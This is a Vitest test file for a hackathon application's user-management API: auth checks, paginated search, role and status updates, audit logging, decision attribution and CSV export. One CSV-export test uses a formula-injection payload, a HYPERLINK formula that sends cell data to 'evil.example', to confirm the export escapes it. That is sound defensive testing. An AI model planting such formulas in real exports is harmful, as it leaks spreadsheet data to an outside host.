import { describe, it, expect, vi, beforeEach } from 'vitest';
import { mockReset, type DeepMockProxy } from 'vitest-mock-extended';
import type { PrismaClient } from '$lib/generated/prisma/client';
import { Role, UserStatus, DecisionStatus, LinkedField } from '$lib/generated/prisma/client';
import { createTestCaller, adminUser, hackerUser, appliedHacker } from '../test-utils';
import { NO_VALUE } from '$lib/facets';
import { EXACT_MATCH_FLOOR } from '$lib/server/recipients';

vi.mock('$lib/server/db', async () => {
	const { mockDeep } = await import('vitest-mock-extended');
	return { prisma: mockDeep<PrismaClient>() };
});

const { prisma } = await import('$lib/server/db');
const db = prisma as DeepMockProxy<PrismaClient>;

beforeEach(() => mockReset(db));

describe('user.me', () => {
	it('returns user with team for authed user', async () => {
		const caller = createTestCaller(db, hackerUser);
		db.user.findUniqueOrThrow.mockResolvedValue({ ...hackerUser, team: null } as never);
		const result = await caller.user.me();
		expect(result).toMatchObject({ uid: hackerUser.uid, email: hackerUser.email });
	});

	it('throws UNAUTHORIZED when no user', async () => {
		const caller = createTestCaller(db, null);
		await expect(caller.user.me()).rejects.toMatchObject({ code: 'UNAUTHORIZED' });
	});
});

describe('user.updateName', () => {
	it.each(Object.values(Role))(
		'allows %s to update only their own name and linked answer',
		async (role) => {
			const caller = createTestCaller(db, { ...hackerUser, role });
			db.question.findMany.mockResolvedValue([{ id: 'name-question' }] as never);
			db.user.update.mockResolvedValue({ name: 'New Name' } as never);
			db.applicationResponse.updateMany.mockResolvedValue({ count: 1 });
			db.$transaction.mockResolvedValue([{ name: 'New Name' }, { count: 1 }] as never);

			const result = await caller.user.updateName({ name: '  New Name  ' });

			expect(result).toEqual({ name: 'New Name' });
			expect(db.question.findMany).toHaveBeenCalledWith({
				where: { linkedField: LinkedField.NAME },
				select: { id: true }
			});
			expect(db.user.update).toHaveBeenCalledWith({
				where: { uid: hackerUser.uid },
				data: { name: 'New Name' },
				select: { name: true }
			});
			expect(db.applicationResponse.updateMany).toHaveBeenCalledWith({
				where: { userId: hackerUser.uid, questionId: { in: ['name-question'] } },
				data: { value: 'New Name' }
			});
		}
	);

	it('rejects empty and overlong names', async () => {
		const caller = createTestCaller(db, hackerUser);

		await expect(caller.user.updateName({ name: '   ' })).rejects.toMatchObject({
			code: 'BAD_REQUEST'
		});
		await expect(caller.user.updateName({ name: 'a'.repeat(101) })).rejects.toMatchObject({
			code: 'BAD_REQUEST'
		});
		expect(db.user.update).not.toHaveBeenCalled();
	});

	it('requires authentication', async () => {
		const caller = createTestCaller(db, null);
		await expect(caller.user.updateName({ name: 'New Name' })).rejects.toMatchObject({
			code: 'UNAUTHORIZED'
		});
	});
});

describe('user.list', () => {
	it('paginates correctly', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.count.mockResolvedValue(100);
		db.user.findMany.mockResolvedValue([hackerUser, appliedHacker]);

		const result = await caller.user.list({ page: 2, pageSize: 10 });

		expect(result.total).toBe(100);
		expect(result.page).toBe(2);
		expect(result.pageSize).toBe(10);
		expect(db.user.findMany).toHaveBeenCalledWith(expect.objectContaining({ skip: 10, take: 10 }));
	});

	it('filters by search term', async () => {
		const caller = createTestCaller(db, adminUser);
		// A productive term: the fuzzy fold is skipped and the clause stays exact.
		db.user.count.mockResolvedValue(EXACT_MATCH_FLOOR);
		db.user.findMany.mockResolvedValue([hackerUser]);

		await caller.user.list({ search: 'hacker' });

		expect(db.user.findMany).toHaveBeenCalledWith(
			expect.objectContaining({
				where: {
					AND: expect.arrayContaining([
						{
							OR: [
								{ name: { contains: 'hacker', mode: 'insensitive' } },
								{ email: { contains: 'hacker', mode: 'insensitive' } }
							]
						}
					])
				}
			})
		);
	});

	/**
	 * What the Users page sends when only the role group narrows. The quiet groups must
	 * contribute no clause at all: an emptied group sending `[]` returned zero organizers.
	 */
	it('filters by role alone when the other groups are cleared', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.count.mockResolvedValue(1);
		db.user.findMany.mockResolvedValue([adminUser]);

		await caller.user.list({ roles: [Role.ORGANIZER] });

		expect(db.user.findMany).toHaveBeenCalledWith(
			expect.objectContaining({ where: { AND: [{ role: { in: [Role.ORGANIZER] } }] } })
		);
	});

	it('throws FORBIDDEN for non-admin', async () => {
		const caller = createTestCaller(db, hackerUser);
		await expect(caller.user.list({})).rejects.toMatchObject({ code: 'FORBIDDEN' });
	});
});

describe('user.getById', () => {
	it('returns user with all relations', async () => {
		const caller = createTestCaller(db, adminUser);
		const fullUser = { ...hackerUser, application: [], team: null, scans: [] };
		db.user.findUniqueOrThrow.mockResolvedValue(fullUser as never);

		const result = await caller.user.getById({ uid: hackerUser.uid });
		expect(result.uid).toBe(hackerUser.uid);
		expect(db.user.findUniqueOrThrow).toHaveBeenCalledWith(
			expect.objectContaining({
				where: { uid: hackerUser.uid },
				include: expect.objectContaining({
					application: expect.anything(),
					scans: expect.anything()
				})
			})
		);
	});

	// The answers only read correctly in the order they were asked, and two consumers
	// sorting for themselves is two chances to disagree.
	it('orders application responses by question.order', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue({
			...hackerUser,
			application: [],
			team: null,
			scans: []
		} as never);

		await caller.user.getById({ uid: hackerUser.uid });

		expect(db.user.findUniqueOrThrow).toHaveBeenCalledWith(
			expect.objectContaining({
				include: expect.objectContaining({
					application: {
						include: { question: true },
						orderBy: { question: { order: 'asc' } }
					}
				})
			})
		);
	});

	it('throws FORBIDDEN for non-admin', async () => {
		const caller = createTestCaller(db, hackerUser);
		await expect(caller.user.getById({ uid: 'some-uid' })).rejects.toMatchObject({
			code: 'FORBIDDEN'
		});
	});
});

describe('user.updateRole', () => {
	it('replaces the role', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue(hackerUser as never);
		db.user.update.mockResolvedValue({ ...hackerUser, role: Role.ADMIN } as never);

		const result = await caller.user.updateRole({ uid: hackerUser.uid, role: Role.ADMIN });
		expect(result.role).toBe(Role.ADMIN);
		expect(db.user.update).toHaveBeenCalledWith({
			where: { uid: hackerUser.uid },
			data: { role: Role.ADMIN }
		});
	});

	it('writes one role, so the previous one cannot survive alongside it', async () => {
		// The mutual-exclusivity guarantee at its only general-purpose write path: the update
		// is a replacement, never an addition.
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue(hackerUser as never);
		db.user.update.mockResolvedValue({ ...hackerUser, role: Role.ORGANIZER } as never);

		await caller.user.updateRole({ uid: hackerUser.uid, role: Role.ORGANIZER });

		const { data } = db.user.update.mock.calls[0][0] as { data: Record<string, unknown> };
		expect(data).toEqual({ role: Role.ORGANIZER });
	});

	it('records the previous role in the audit entry', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue(hackerUser as never);
		db.user.update.mockResolvedValue({ ...hackerUser, role: Role.ADMIN } as never);

		await caller.user.updateRole({ uid: hackerUser.uid, role: Role.ADMIN });

		expect(db.log.create).toHaveBeenCalledWith({
			data: expect.objectContaining({
				action: 'user.roles.update',
				actorId: adminUser.uid,
				actorName: adminUser.name,
				targetId: hackerUser.uid,
				metadata: { from: hackerUser.role, to: Role.ADMIN }
			})
		});
	});

	it('refuses to demote the last admin', async () => {
		// Exclusive roles make this reachable by an edit that reads as a promotion:
		// giving the sole admin the HACKER role now *removes* their admin access.
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue(adminUser as never);
		db.user.count.mockResolvedValue(0 as never);

		await expect(
			caller.user.updateRole({ uid: adminUser.uid, role: Role.HACKER })
		).rejects.toMatchObject({ code: 'BAD_REQUEST' });
		expect(db.user.update).not.toHaveBeenCalled();
	});

	it('allows demoting an admin while another admin remains', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue(adminUser as never);
		db.user.count.mockResolvedValue(1 as never);
		db.user.update.mockResolvedValue({ ...adminUser, role: Role.HACKER } as never);

		await expect(
			caller.user.updateRole({ uid: adminUser.uid, role: Role.HACKER })
		).resolves.toMatchObject({ role: Role.HACKER });
	});

	it('throws FORBIDDEN for non-admin', async () => {
		const caller = createTestCaller(db, hackerUser);
		await expect(caller.user.updateRole({ uid: 'uid', role: Role.HACKER })).rejects.toMatchObject({
			code: 'FORBIDDEN'
		});
	});
});

describe('user.updateStatus', () => {
	it('updates status', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue(hackerUser as never);
		db.user.update.mockResolvedValue({ ...hackerUser, status: UserStatus.APPLIED } as never);

		const result = await caller.user.updateStatus({
			uid: hackerUser.uid,
			status: UserStatus.APPLIED
		});
		expect(result.status).toBe(UserStatus.APPLIED);
	});

	it('throws FORBIDDEN for non-admin', async () => {
		const caller = createTestCaller(db, hackerUser);
		await expect(
			caller.user.updateStatus({ uid: 'uid', status: UserStatus.APPLIED })
		).rejects.toMatchObject({ code: 'FORBIDDEN' });
	});
});

describe('user.exportCsv', () => {
	it('returns CSV with header row', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.findMany.mockResolvedValue([hackerUser] as never);

		const csv = await caller.user.exportCsv();
		const lines = csv.split('\n');
		expect(lines[0]).toBe(
			'uid,name,email,role,status,pendingDecision,activeDecision,teamId,createdAt'
		);
		expect(lines[1]).toContain(hackerUser.uid);
		expect(lines[1]).toContain(hackerUser.email);
	});

	it('escapes double quotes in names', async () => {
		const caller = createTestCaller(db, adminUser);
		const userWithQuotes = { ...hackerUser, name: 'John "the man" Doe' };
		db.user.findMany.mockResolvedValue([userWithQuotes] as never);

		const csv = await caller.user.exportCsv();
		expect(csv).toContain('"John ""the man"" Doe"');
	});

	it('quotes every field, not just the name', async () => {
		// A comma anywhere in stored data — a university, a name — shifts every
		// column after it, and the reader has no way to notice.
		const caller = createTestCaller(db, adminUser);
		db.user.findMany.mockResolvedValue([
			{ ...hackerUser, name: 'Doe, John', teamId: 'team-1' }
		] as never);

		const csv = await caller.user.exportCsv();
		const row = csv.split('\n')[1];

		expect(row).toBe(
			`"${hackerUser.uid}","Doe, John","${hackerUser.email}","HACKER","CREATED","","","team-1","${hackerUser.createdAt.toISOString()}"`
		);
	});

	it('neutralizes fields a spreadsheet would run as a formula', async () => {
		// The whole point: an applicant-controlled name opening with `=` executes on
		// open in Excel and Sheets. The apostrophe forces it to be read as text.
		const caller = createTestCaller(db, adminUser);
		db.user.findMany.mockResolvedValue([
			{ ...hackerUser, name: '=HYPERLINK("https://evil.example?d="&A1,"click")' },
			{ ...hackerUser, name: '+1 (512) 555-0100' },
			{ ...hackerUser, name: '-2+3' },
			{ ...hackerUser, name: '@SUM(A1:A9)' }
		] as never);

		const rows = (await caller.user.exportCsv()).split('\n').slice(1);

		expect(rows[0]).toContain('"\'=HYPERLINK(""https://evil.example?d=""&A1,""click"")"');
		expect(rows[1]).toContain('"\'+1 (512) 555-0100"');
		expect(rows[2]).toContain('"\'-2+3"');
		expect(rows[3]).toContain(`"'@SUM(A1:A9)"`);
	});

	it('leaves an ordinary value untouched apart from quoting', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.findMany.mockResolvedValue([{ ...hackerUser, name: 'Jane Doe' }] as never);

		const csv = await caller.user.exportCsv();
		expect(csv).toContain('"Jane Doe"');
		expect(csv).not.toContain("'Jane");
	});

	it('throws FORBIDDEN for non-admin', async () => {
		const caller = createTestCaller(db, hackerUser);
		await expect(caller.user.exportCsv()).rejects.toMatchObject({ code: 'FORBIDDEN' });
	});
});

describe('user.list — linked application fields', () => {
	beforeEach(() => {
		db.user.count.mockResolvedValue(1);
		db.user.findMany.mockResolvedValue([hackerUser]);
	});

	/** The AND conditions the listing query was given. */
	function whereConditions() {
		const where = db.user.findMany.mock.calls.at(-1)?.[0]?.where as { AND: unknown[] };
		return where.AND;
	}

	it('filters by year with an exact IN', async () => {
		await createTestCaller(db, adminUser).user.list({ years: ['Senior'] });
		expect(whereConditions()).toContainEqual({ year: { in: ['Senior'] } });
	});

	it('matches nothing when a linked filter is engaged but empty', async () => {
		// user.list is the browse half of the pair that must agree with sendCustom.
		await createTestCaller(db, adminUser).user.list({ universities: [] });
		expect(whereConditions()).toContainEqual({ uid: 'IMPOSSIBLE_NO_MATCH' });
	});

	it('adds no clause when the linked filters are absent', async () => {
		await createTestCaller(db, adminUser).user.list({});
		const where = db.user.findMany.mock.calls.at(-1)?.[0]?.where;
		expect(where).toEqual({});
	});

	it('selects NULL and empty alike for the NO_VALUE sentinel', async () => {
		await createTestCaller(db, adminUser).user.list({ years: [NO_VALUE] });
		expect(whereConditions()).toContainEqual({ OR: [{ year: null }, { year: '' }] });
	});

	it('stacks a linked filter with the rest under AND', async () => {
		await createTestCaller(db, adminUser).user.list({
			roles: [Role.HACKER],
			universities: ['Rice University']
		});
		expect(whereConditions()).toHaveLength(2);
	});
});

describe('user.list — typo-tolerant search', () => {
	it('reports no fuzzy fallback when the term is already productive', async () => {
		db.user.count.mockResolvedValue(EXACT_MATCH_FLOOR);
		db.user.findMany.mockResolvedValue([hackerUser]);

		const result = await createTestCaller(db, adminUser).user.list({ search: 'hacker' });
		expect(result.search).toEqual({
			names: [],
			fuzzy: false,
			capped: false,
			exact: EXACT_MATCH_FLOOR
		});
	});

	it('widens to close names and says that it did', async () => {
		db.user.count.mockResolvedValue(0);
		db.user.findMany
			.mockResolvedValueOnce([{ name: 'Hacker User' }] as never)
			.mockResolvedValueOnce([hackerUser]);

		const result = await createTestCaller(db, adminUser).user.list({ search: 'Hackr' });
		// `exact: 0` is what lets the strip say "No exact match" and mean it.
		expect(result.search).toEqual({
			names: ['Hacker User'],
			fuzzy: true,
			capped: false,
			exact: 0
		});
		const where = db.user.findMany.mock.calls.at(-1)?.[0]?.where as { AND: unknown[] };
		expect(where.AND).toContainEqual({
			OR: [
				{ name: { contains: 'Hackr', mode: 'insensitive' } },
				{ email: { contains: 'Hackr', mode: 'insensitive' } },
				{ name: { in: ['Hacker User'] } }
			]
		});
	});
});

describe('user.updateDecisions attribution', () => {
	/** Mocks the before-read and the write, returning the `data` the router sent. */
	async function override(
		before: { pendingDecision: DecisionStatus | null; activeDecision: DecisionStatus | null },
		pendingDecision: DecisionStatus | null
	) {
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue(before as never);
		db.user.update.mockResolvedValue({ ...hackerUser, pendingDecision } as never);
		db.log.create.mockResolvedValue({} as never);

		await caller.user.updateDecisions({ uid: hackerUser.uid, pendingDecision });
		return db.user.update.mock.calls[0]?.[0]?.data as Record<string, unknown>;
	}

	it('reassigns credit when the decision actually changes', async () => {
		const data = await override(
			{ pendingDecision: DecisionStatus.ACCEPTED, activeDecision: null },
			DecisionStatus.REJECTED
		);

		expect(data.decidedBy).toBe(adminUser.uid);
		// Not `toEqual(new Date())` — this suite runs on the real clock, so that
		// passes only when both calls land in the same millisecond.
		expect(data.decidedAt).toBeInstanceOf(Date);
		expect(Date.now() - (data.decidedAt as Date).getTime()).toBeLessThan(5000);
	});

	/**
	 * The regression this guard exists for: /admin/users saves role, status and decision
	 * in one Promise.all, so this fires on every save with the decision echoed back
	 * untouched. Stamping unconditionally would misattribute another admin's decision.
	 */
	it('leaves attribution alone when the decision is unchanged', async () => {
		const data = await override(
			{ pendingDecision: DecisionStatus.ACCEPTED, activeDecision: null },
			DecisionStatus.ACCEPTED
		);

		expect(data).not.toHaveProperty('decidedBy');
		expect(data).not.toHaveProperty('decidedAt');
	});

	it('clears attribution when the pending decision is cleared and nothing stands', async () => {
		const data = await override(
			{ pendingDecision: DecisionStatus.ACCEPTED, activeDecision: null },
			null
		);

		expect(data.decidedBy).toBeNull();
		expect(data.decidedAt).toBeNull();
	});

	it('never writes activeDecision — a published outcome changes only by release', async () => {
		const data = await override(
			{ pendingDecision: DecisionStatus.WAITLISTED, activeDecision: null },
			DecisionStatus.ACCEPTED
		);

		expect(data).not.toHaveProperty('activeDecision');
	});

	/**
	 * Zod strips unknown keys rather than rejecting them, so a stale client that still
	 * sends `activeDecision` gets no error. What matters is that it never reaches the
	 * database.
	 */
	it('drops activeDecision from the payload if a caller still sends it', async () => {
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue({
			pendingDecision: null,
			activeDecision: null
		} as never);
		db.user.update.mockResolvedValue(hackerUser as never);
		db.log.create.mockResolvedValue({} as never);

		await caller.user.updateDecisions({
			uid: hackerUser.uid,
			pendingDecision: DecisionStatus.ACCEPTED,
			activeDecision: DecisionStatus.REJECTED
		} as never);

		const data = db.user.update.mock.calls[0]?.[0]?.data as Record<string, unknown>;
		expect(data).not.toHaveProperty('activeDecision');
		expect(data.pendingDecision).toBe(DecisionStatus.ACCEPTED);
	});
});

/**
 * Released applicants are closed to decision edits here. `release` clears the pending
 * decision and emails the outcome, and this endpoint will not edit one back and forth
 * behind an outcome the applicant has already been told.
 */
describe('user.updateDecisions once released', () => {
	function releasedApplicant(pendingDecision: DecisionStatus | null) {
		const caller = createTestCaller(db, adminUser);
		db.user.findUniqueOrThrow.mockResolvedValue({
			pendingDecision,
			activeDecision: DecisionStatus.ACCEPTED
		} as never);
		return caller;
	}

	it('rejects setting a pending decision on a released applicant', async () => {
		const caller = releasedApplicant(null);

		await expect(
			caller.user.updateDecisions({ uid: hackerUser.uid, pendingDecision: DecisionStatus.REJECTED })
		).rejects.toMatchObject({ code: 'CONFLICT' });
		expect(db.user.update).not.toHaveBeenCalled();
	});

	it('rejects clearing a pending decision on a released applicant', async () => {
		const caller = releasedApplicant(DecisionStatus.WAITLISTED);

		await expect(
			caller.user.updateDecisions({ uid: hackerUser.uid, pendingDecision: null })
		).rejects.toMatchObject({ code: 'CONFLICT' });
		expect(db.user.update).not.toHaveBeenCalled();
	});

	/**
	 * The no-op case matters most: /admin/users fires this on every save. It still
	 * refuses rather than passing through, which is why the page skips the call entirely
	 * for a released applicant.
	 */
	it('rejects even a no-op resend, which is why the page skips the call', async () => {
		const caller = releasedApplicant(null);

		await expect(
			caller.user.updateDecisions({ uid: hackerUser.uid, pendingDecision: null })
		).rejects.toMatchObject({ code: 'CONFLICT' });
	});

	it('writes no audit entry for a rejected edit', async () => {
		const caller = releasedApplicant(null);

		await expect(
			caller.user.updateDecisions({ uid: hackerUser.uid, pendingDecision: DecisionStatus.ACCEPTED })
		).rejects.toMatchObject({ code: 'CONFLICT' });
		expect(db.log.create).not.toHaveBeenCalled();
	});
});
